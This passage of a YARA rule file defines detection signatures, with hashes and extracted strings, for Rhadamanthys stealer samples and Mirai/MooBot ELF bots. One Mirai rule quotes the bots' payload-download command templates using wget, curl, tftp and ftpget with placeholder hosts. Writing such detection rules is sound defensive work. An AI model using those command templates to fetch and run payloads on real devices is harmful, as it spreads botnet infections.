      hash1 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
      hash2 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
   strings:
      $s1 = "\"get_VersionString" fullword ascii /* score: '12.00'*/
      $s2 = "LdTokenHelpers$RuntimeInteropData'0" fullword ascii /* score: '10.00'*/
      $s3 = "GetMonthName:get_UnclonedYearMonthPatterns:get_UnclonedShortDatePatterns8get_UnclonedLongDatePatterns(get_DecimalSeparator*Initi" ascii /* score: '9.00'*/
      $s4 = ":InternalGetGenitiveMonthNames:InternalGetLeapYearMonthNames.GetAbbreviatedMonthName" fullword ascii /* score: '9.00'*/
      $s5 = "GetEraName\"get_DateSeparator.get_FullDateTimePattern&get_LongDatePattern&get_LongTimePattern&get_MonthDayPattern(get_ShortDateP" ascii /* score: '9.00'*/
      $s6 = "GetMonthName:get_UnclonedYearMonthPatterns:get_UnclonedShortDatePatterns8get_UnclonedLongDatePatterns(get_DecimalSeparator*Initi" ascii /* score: '9.00'*/
      $s7 = "GetId\"IdTracksAllValues" fullword ascii /* score: '9.00'*/
      $s8 = "ttern(get_ShortTimePattern6get_GeneralShortTimePattern4get_GeneralLongTimePattern2get_DateTimeOffsetPattern(get_YearMonthPattern" ascii /* score: '9.00'*/
      $s9 = ".get_AbbreviatedDayNames" fullword ascii /* score: '9.00'*/
      $s10 = "GetEraName\"get_DateSeparator.get_FullDateTimePattern&get_LongDatePattern&get_LongTimePattern&get_MonthDayPattern(get_ShortDateP" ascii /* score: '9.00'*/
      $s11 = "4get_IsDynamicCodeSupported\\CheckStaticClassConstructionReturnGCStaticBase" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__1ba40c4c_Rhadamanthys_signature__20e0ed54_Rhadamanthys_signature__4f7370d7_Rhadamanthys_signature___129 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_1ba40c4c.zip, Rhadamanthys(signature)_20e0ed54.zip, Rhadamanthys(signature)_4f7370d7.zip, Rhadamanthys(signature)_5a22c365.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1ba40c4c35d04861a4dd44705866c8666026085a9387c49e12339c6383d959d9"
      hash2 = "20e0ed549ee66faf82d3bb5f1121a470c1549d444245ef7ae553b465aa95a83b"
      hash3 = "4f7370d7e3fcd661b00452b20ffaeca1e5d150f197e635f80cd2c16a34519bb3"
      hash4 = "5a22c3651476eec5219cd91c94727e392dbce2aa55d6dff8e987ba326e2ab91a"
   strings:
      $x1 = "x86/api-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x2 = "x86/api-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $s3 = "x86/api-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s4 = "x86/api-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s5 = "x86/api-ms-win-crt-private-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s6 = "x86/api-ms-win-crt-convert-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s7 = "x86/api-ms-win-core-timezone-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s8 = "x86/api-ms-win-core-synch-l1-2-0.dll" fullword ascii /* score: '20.00'*/
      $s9 = "x86/api-ms-win-core-synch-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s10 = "x86/api-ms-win-crt-environment-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s11 = "x86/api-ms-win-core-string-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s12 = "x86/api-ms-win-core-util-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s13 = "x86/api-ms-win-core-sysinfo-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s14 = "x86/api-ms-win-crt-multibyte-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s15 = "x86/api-ms-win-crt-math-l1-1-0.dll" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x4b50 and filesize < 26000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__fe0ea22b_Mirai_signature__fefdf9c6_Mirai_signature__ff2c5652_MooBot_signature__130 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_fe0ea22b.elf, Mirai(signature)_fefdf9c6.elf, Mirai(signature)_ff2c5652.elf, MooBot(signature).elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fe0ea22b02a64f3985a4b99ed907c09404b5486da0629a736ca5a8d6da1bd639"
      hash2 = "fefdf9c6e63e7aa2004f9cf63efd95f9cb5c16f18db75c8898bce73e6da8b4df"
      hash3 = "ff2c5652526c1a3485f50de7ffdba21b8ea1398a413b88cd8e81588c010f9ba4"
      hash4 = "f2a36187a53e4ab42b99f1b21adfbe3850daefa24e0d4f9614fd17b0723770df"
   strings:
      $s1 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii /* score: '17.00'*/
      $s2 = "HOST: 255.255.255.255:1900" fullword ascii /* score: '14.00'*/
      $s3 = "service:service-agent" fullword ascii /* score: '12.00'*/
      $s4 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii /* score: '9.00'*/
      $s5 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ" ascii /* score: '8.00'*/
      $s6 = "/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID" ascii /* score: '8.00'*/
      $s7 = "/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii /* score: '8.00'*/
      $s8 = "/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38" ascii /* score: '8.00'*/
      $s9 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ" ascii /* score: '8.00'*/
      $s10 = "/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" fullword ascii /* score: '8.00'*/
      $s11 = "/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__93a138801d9601e4c36e6274c8b9d111__131 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_93a138801d9601e4c36e6274c8b9d111(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_694ace6e.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_71f4b177.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_a14ca283.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_aaa80a57.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_bb3b307d.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_c2d5e6e9.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_f5139fc2.exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "769de98d15369885e5dd8dac76722a72cab4999c4b6b70b5b111f6735399ce52"
      hash2 = "a17b22c0eedfc76e3c98dedb4f0c7655370a70a3a715d82f253b5b5824be6105"
      hash3 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash4 = "694ace6efcabaf0ba32a66581b6e710bf432761f18984891a78b5377109d7ef9"
      hash5 = "71f4b177ab5dbf844397591deda7cbb750b4fc3dda07c10f41ee3d7615278976"
      hash6 = "a14ca283ce205cbc9c1ca540cdfc17ff62e28557de5fa1eedfdddfdd4456b27e"
      hash7 = "aaa80a57fa8ecfcdcec28fec4b338eb015925e2e2b57b4aa910d559bce58199c"
      hash8 = "bb3b307d85e0e4c237c2e2ddd4222f7a93cf769c9064c08cba0940d44d62436a"
      hash9 = "c2d5e6e925c2450d4d5d8cba94c7570049a4da43647165fe9db23e009c977f91"
      hash10 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
      hash11 = "f5139fc2fa5525e89dde9d4d8ccf522bf60a7990fa0e213218a11d1f23c2d7ee"
      hash12 = "5a68af44b9399b0bf6e41e5d60b994251dedb610c700dcfd81198b67a0518d0e"
   strings:
      $s1 = "runtime.getproccount" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.(*gcWork).tryGetFast" fullword ascii /* score: '12.00'*/
      $s3 = "runtime.(*gcWork).tryGet" fullword ascii /* score: '12.00'*/
      $s4 = "runtime.ncpu" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.atoi32" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.gcMarkRootPrepare.func1" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.(*gcWork).put" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.atoi" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.gcMarkRootPrepare" fullword ascii /* score: '10.00'*/
      $s10 = "tryGetFast" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( all of them )
      ) or ( all of them )
}

rule _Mirai_signature__fd10c7fd_Mirai_signature__fd44f39e_Mirai_signature__fdc864a8_Mirai_signature__fe1a3636_Mirai_signature__fe_132 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_fd10c7fd.elf, Mirai(signature)_fd44f39e.elf, Mirai(signature)_fdc864a8.elf, Mirai(signature)_fe1a3636.elf, Mirai(signature)_fe435e9a.elf, Mirai(signature)_ff270d3b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fd10c7fd9ea0f7fe3c8e91e31f009b079ff5f58556e83cd6f087d63e76bff751"
      hash2 = "fd44f39e0f1ac9e64c08beb1d889a7e6f8e55a39e1e71d9a04bc32631a50cde3"
      hash3 = "fdc864a8a3fac746362f853859ddc92efd7d9bf1234059e46e53e7f540b3d2c4"
      hash4 = "fe1a36365c82ff122835f09366a2e593f55a67adf0662e5864d62d2dbf66ad37"
      hash5 = "fe435e9a106bc2e35e64698fde5ea25f7be61b5cc9e9b5cd343e59f71d6d5b51"
      hash6 = "ff270d3b7ca41d9ff9bb2ac761319a2bea9a21b6b9e536e90bd3fa309f4ad775"
   strings:
      $s1 = "cd %s && tftp -g -r %s %s" fullword ascii /* score: '23.00'*/
      $s2 = "tftp %s -c get %s %s" fullword ascii /* score: '20.00'*/
      $s3 = "ftpget -v -u anonymous -p anonymous -P 21 %s %s %s" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://%s/%s/%s -O %s" fullword ascii /* score: '19.00'*/
      $s5 = "curl -o %s http://%s/%s/%s" fullword ascii /* score: '18.00'*/
      $s6 = "/usr/sbin/wget" fullword ascii /* score: '12.00'*/
      $s7 = "/usr/sbin/ftpget" fullword ascii /* score: '12.00'*/
      $s8 = "/usr/sbin/tftp" fullword ascii /* score: '12.00'*/
      $s9 = "/usr/bin/ftpget" fullword ascii /* score: '9.00'*/
      $s10 = "/usr/bin/wget" fullword ascii /* score: '9.00'*/
      $s11 = "/usr/bin/tftp" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

